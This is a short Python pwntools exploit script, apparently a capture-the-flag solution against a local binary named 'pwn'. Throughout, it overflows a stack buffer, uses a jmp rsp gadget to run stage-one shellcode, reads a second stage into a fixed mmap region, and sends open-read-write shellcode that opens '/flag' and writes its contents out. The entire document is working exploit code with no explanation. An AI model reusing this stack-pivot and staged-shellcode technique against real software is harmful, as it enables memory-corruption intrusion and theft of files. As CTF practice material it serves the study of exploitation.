from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#io = remote('ip' , port)
io = process('./pwn')
mmap = 0x123000
jmp_rsp = 0x400a01

payload = asm(shellcraft.read(0, mmap, 0x100)) + asm("mov rax, 0x123000; jmp rax")
payload = payload.ljust(0x28,b'a')
payload += p64(jmp_rsp) +asm("sub rsp, 0x30; jmp rsp")

orw_shellcode = shellcraft.open("/flag") + shellcraft.read(3, mmap, 0x100) + shellcraft.write(1, mmap, 0x100)
shellcode = asm(orw_shellcode)

io.recvuntil('do')
io.sendline(payload)
io.sendline(shellcode)
io.interactive()

